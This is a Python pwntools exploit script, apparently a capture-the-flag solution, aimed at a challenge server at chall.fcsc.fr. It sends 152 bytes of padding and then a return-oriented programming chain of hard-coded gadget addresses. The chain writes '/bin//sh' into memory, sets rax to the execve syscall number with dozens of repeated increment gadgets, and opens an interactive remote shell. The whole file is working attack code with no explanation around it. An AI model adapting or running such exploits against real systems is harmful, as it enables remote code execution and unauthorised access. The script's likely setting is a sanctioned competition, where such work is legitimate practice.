from pwn import *

HOST, PORT = "chall.fcsc.fr", 2105
io = remote(HOST, PORT)

from struct import pack

p = b'A'*152

p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
p += pack('<Q', 0x00000000004c40e0) # @ .data
p += pack('<Q', 0x00000000004424f7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000445371) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
p += pack('<Q', 0x0000000000434a1f) # nop; xor rax, rax ; ret
p += pack('<Q', 0x0000000000445371) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401f60) # pop rdi ; ret
p += pack('<Q', 0x00000000004c40e0) # @ .data
p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
p += pack('<Q', 0x00000000004867a7) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000434a1f) # nop; xor rax, rax ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000479c10) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004011a2) # syscall

print(io.recvuntil('Which file would like to encrypt?\n').decode())

io.sendline(p)

io.interactive()